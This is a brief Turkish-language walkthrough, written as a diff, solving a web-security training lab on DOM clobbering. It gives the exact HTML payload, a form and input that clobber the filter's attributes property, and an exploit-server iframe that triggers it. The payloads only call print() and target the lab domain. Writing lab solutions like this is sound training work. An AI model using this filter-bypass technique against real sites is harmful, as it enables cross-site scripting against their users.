@@ -1,0 +1,9 @@
+LAB: Clobbering DOM attributes to bypass HTML filters
+
+1 - Herhangi bir gönderi sayfasına girip aşağıdaki payloadı yorum olarak atın.
+<form id=x tabindex=0 onfocus=print()><input id=attributes>
+
+2 - Exploit servere giderek aşağıdaki payloadı depolayın.
+<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
+
+3 - Tekrar gönderi sayfasına gelerek sayfayı yenileyin.
